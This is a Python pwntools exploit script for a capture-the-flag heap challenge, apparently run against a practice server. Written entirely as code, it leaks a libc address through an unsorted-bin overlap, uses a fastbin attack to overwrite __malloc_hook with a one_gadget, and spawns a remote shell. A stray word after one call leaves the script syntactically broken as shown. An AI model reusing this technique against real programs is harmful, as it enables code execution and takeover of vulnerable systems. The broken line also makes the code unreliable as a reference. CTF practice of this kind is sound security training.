#!//usr/bin/python
#-*- coding:utf-8-*-
from pwn import *
context.binary = ELF("./nsctf_online_2019_pwn2")
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0xcad')
	raw_input()

def menu(ch):
	p.sendlineafter('6.exit', str(ch))

def add(size):
	menu(1)
	p.sendlineafter('size', str(size))
	print "add a chunk!"

def free():
	menu(2)

def show():
	menu(3)

def upname(name):
	menu(4)
	p.sendafter('name', name)

def edit(content):
	menu(5)
	p.sendafter('note', content)

def exploit():
	p.sendafter('name', 'a')tho

	#leak libc
	add(0x80)
	add(0x18)
	upname('a'*0x30+'\x10')
	free()						#into unsorted bin

	add(0x18)					#split from unsorted bin
	upname('a'*0x30+'\x30')		#which points to main_arena
	show()
	
	sleep(1)
	leak = p.recvuntil('\x7f')

	leak = u64(leak[-6:].ljust(8, '\x00'))
	libc_base = leak - 0x3c4b20 - 0x58

	libc.address = libc_base
	__malloc_hook = libc.symbols['__malloc_hook']
	print "leak ==> " + hex(leak)
	print "libc_base ==> " + hex(libc_base)

	
	#fastbin attack
	add(0x68)
	free()
	add(0x18)
	upname('a'*0x30 + '\x30')
	edit(p64(__malloc_hook-0x23))
	add(0x68)
	add(0x68)

	#dbg()
	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	edit('a'*0xb + p64(libc_base + gadgets[1]) + p64(libc.symbols['realloc']+11))


	add(0x100)					#triger
	p.interactive()
	p.close()


if __name__ == '__main__':
	#p = process("./nsctf_online_2019_pwn2")
	p = remote('node3.buuoj.cn', 29503)
	exploit()